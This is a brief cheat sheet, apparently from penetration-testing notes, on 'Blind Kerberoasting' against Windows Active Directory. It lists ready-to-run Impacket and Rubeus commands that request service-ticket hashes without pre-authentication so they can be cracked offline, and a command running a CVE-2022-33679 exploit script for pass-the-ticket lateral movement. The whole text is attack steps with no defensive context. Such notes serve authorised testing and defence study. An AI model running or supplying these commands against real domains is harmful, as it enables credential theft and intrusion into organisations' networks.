# Blind Kerberoasting

## Find TGS Hash

    Impacket-GetUserSPNs -no-preauth "ASREP_USER" -usersfile "USER_LIST.TXT" -dc-host "DC_IP" "DOMAIN"/ (Blind Kerberoasting)

    Rubeus.exe kerberoast /domain:DOMAIN /dc:DC_IP /nopreauth: ASREP_USER /spns:USERS.TXT (Blind Kerberoasting)

## Lateral Movement (PTT)

    python3 CVE-2022-33679.py DOMAIN/USER TARGET
